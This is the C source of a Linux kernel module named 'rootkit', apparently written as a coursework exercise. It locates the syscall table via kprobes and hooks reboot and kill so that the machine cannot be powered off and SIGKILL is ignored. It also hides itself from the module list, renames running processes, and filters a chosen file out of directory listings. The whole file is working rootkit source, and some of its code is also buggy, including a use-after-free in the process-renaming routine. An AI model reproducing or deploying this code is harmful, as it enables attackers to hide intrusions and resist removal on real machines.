#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/kprobes.h>
#include <linux/reboot.h>
#include <asm/syscall.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("R12922072");
MODULE_DESCRIPTION("R12922072");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
static struct list_head *modules_head;
static syscall_fn_t *sys_call_table_ptr;
DEFINE_MUTEX(sys_call_table_lock);
static void (*update_mapping_prot_ptr)(phys_addr_t, unsigned long,
					phys_addr_t, pgprot_t);
static syscall_fn_t sys_reboot_orig;
static syscall_fn_t sys_kill_orig;
static syscall_fn_t sys_getdents64_orig;
static struct hided_file hided_file;
static filldir_t filldir64_ptr;

static void modify_syscall_table(syscall_fn_t *hook_arr,
				 int *syscall_nr_arr, int num)
{
	int i;

	mutex_lock(&sys_call_table_lock);
	update_mapping_prot_ptr(virt_to_phys(sys_call_table_ptr),
				(unsigned long)sys_call_table_ptr,
				sizeof(syscall_fn_t) * __NR_syscalls,
				PAGE_KERNEL);

	for (i = 0; i < num; i++)
		sys_call_table_ptr[syscall_nr_arr[i]] = hook_arr[i];

	update_mapping_prot_ptr(virt_to_phys(sys_call_table_ptr),
				(unsigned long)sys_call_table_ptr,
				sizeof(syscall_fn_t) * __NR_syscalls,
				PAGE_KERNEL_RO);
	mutex_unlock(&sys_call_table_lock);
}

static int rootkit_open(struct inode *inode, struct file *filp)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	register_kprobe(&kp);
	kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
	unregister_kprobe(&kp);

	sys_call_table_ptr = (syscall_fn_t *)
		kallsyms_lookup_name_ptr("sys_call_table");
	update_mapping_prot_ptr = (void (*)(phys_addr_t, unsigned long,
					    phys_addr_t, pgprot_t))
		kallsyms_lookup_name_ptr("update_mapping_prot");
	filldir64_ptr = (filldir_t)kallsyms_lookup_name_ptr("filldir64");
	sys_kill_orig = sys_call_table_ptr[__NR_kill];
	sys_reboot_orig = sys_call_table_ptr[__NR_reboot];
	sys_getdents64_orig = sys_call_table_ptr[__NR_getdents64];
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	int syscall_nr_arr[3] = { __NR_reboot, __NR_kill, __NR_getdents64 };
	syscall_fn_t hook_arr[3] = { sys_reboot_orig,
				     sys_kill_orig,
				     sys_getdents64_orig };

	modify_syscall_table(hook_arr,syscall_nr_arr, 3);

	return 0;
}

long reboot_hook(const struct pt_regs *regs)
{
	if (regs->regs[2] == LINUX_REBOOT_CMD_POWER_OFF)
		while (true);
	return sys_reboot_orig(regs);
}

long kill_hook(const struct pt_regs *regs)
{
	if (regs->regs[1] == SIGKILL)
		return 0;
	else
		return sys_kill_orig(regs);
}

static int hook_syscall(unsigned long arg)
{
	int ret = 0;
	int syscall_nr_arr[2] = { __NR_reboot, __NR_kill };
	syscall_fn_t hook_arr[2];

	if (sys_call_table_ptr[__NR_reboot] == sys_reboot_orig) {
		hook_arr[0] = reboot_hook;
		hook_arr[1] = kill_hook;
	} else {
		hook_arr[0] = sys_reboot_orig;
		hook_arr[1] = sys_kill_orig;
	}
	modify_syscall_table(hook_arr, syscall_nr_arr, 2);

	return ret;
}

static int masq_module(unsigned long arg)
{
	int ret = 0;
	int n, i;
	struct masq_proc_req *req;
	struct masq_proc_req __user *usr_req;
	struct task_struct *p;

	n = sizeof(struct masq_proc_req);
	req = kmalloc(n, GFP_KERNEL);
	usr_req = (struct masq_proc_req *)arg;
	if (!req) {
		ret = -ENOMEM;
		goto masq_break;
	}
	if (copy_from_user(req, usr_req, n)) {
		ret = -EFAULT;
		goto masq_break;
	}

	n = req->len * sizeof(struct masq_proc);
	req->list = kmalloc(n, GFP_KERNEL);
	if (!req->list) {
		ret = -ENOMEM;
		goto masq_break;
	}
	if (copy_from_user(req->list, usr_req->list, n)) {
		ret = -EFAULT;
		goto masq_break;
	}

	for (i = 0; i < req->len; i++) {
		char *orig_name, *new_name;
		int orig_len, new_len;
		orig_name = req->list[i].orig_name;
		new_name = req->list[i].new_name;
		orig_len = strlen(orig_name);
		new_len = strlen(new_name);
		if (new_len >= orig_len)
			continue;
		for_each_process(p)
			if (strncmp(p->comm, orig_name, orig_len) == 0)
				strncpy(p->comm, new_name, sizeof(p->comm));
	}
masq_break:
	if (req)
		kfree(req);
	if (req->list)
		kfree(req->list);
	return ret;
}

struct getdents_callback64 {
	struct dir_context ctx;
	struct linux_dirent64 __user * current_dir;
	int prev_reclen;
	int count;
	int error;
};

long getdents64_hook(const struct pt_regs *regs)
{
	long ret = 0;
	struct linux_dirent64 *filter_dirent;
	char __user *usr_buf;
	char *out_buf;
	size_t usr_buf_offset = 0, out_buf_offset = 0;

	ret = sys_getdents64_orig(regs);
	if (ret <= 0)
		return ret;
	usr_buf = kmalloc(ret, GFP_KERNEL);
	out_buf = kmalloc(ret, GFP_KERNEL);
	if (!usr_buf)
		return -ENOMEM;
	usr_buf = (char *)regs->regs[1];
	while (usr_buf_offset < ret) {
		filter_dirent = (struct linux_dirent64 *)(usr_buf + usr_buf_offset);
		if (strcmp(hided_file.name, filter_dirent->d_name)) {
		 	memcpy(out_buf+out_buf_offset,
		 	       usr_buf+usr_buf_offset, filter_dirent->d_reclen);
			out_buf_offset += filter_dirent->d_reclen;
		}
		usr_buf_offset += filter_dirent->d_reclen;
	}

	if (copy_to_user(usr_buf, out_buf, out_buf_offset) < 0)
		ret = -EFAULT;
	kfree(out_buf);
	ret = out_buf_offset;
	return ret;
}

static int hide_file(unsigned long arg)
{
	int ret = 0;
	struct hided_file __user *usr_arg = (struct hided_file *)arg;
	syscall_fn_t hook_arr[1] = { getdents64_hook };
	int syscall_nr_arr[1] = { __NR_getdents64 };

	if (copy_from_user(&hided_file, usr_arg, sizeof(hided_file)))
		return -EFAULT;
	modify_syscall_table(hook_arr, syscall_nr_arr, 1);
	return ret;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	int ret = 0;

	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		hook_syscall(arg);
		break;
	case IOCTL_MOD_HIDE:
		if (THIS_MODULE->list.next || THIS_MODULE->list.prev) {
			list_del_rcu(&THIS_MODULE->list);
			THIS_MODULE->list.next = THIS_MODULE->list.prev = NULL;
		} else
			list_add_rcu(&THIS_MODULE->list, modules_head);
		break;
	case IOCTL_MOD_MASQ:
		ret = masq_module(arg);
		break;
	case IOCTL_FILE_HIDE:
		hide_file(arg);
		break;
	default:
		ret = -EINVAL;
	}
	return ret;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	modules_head = THIS_MODULE->list.prev;

	return 0;
}

static void __exit rootkit_exit(void)
{
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
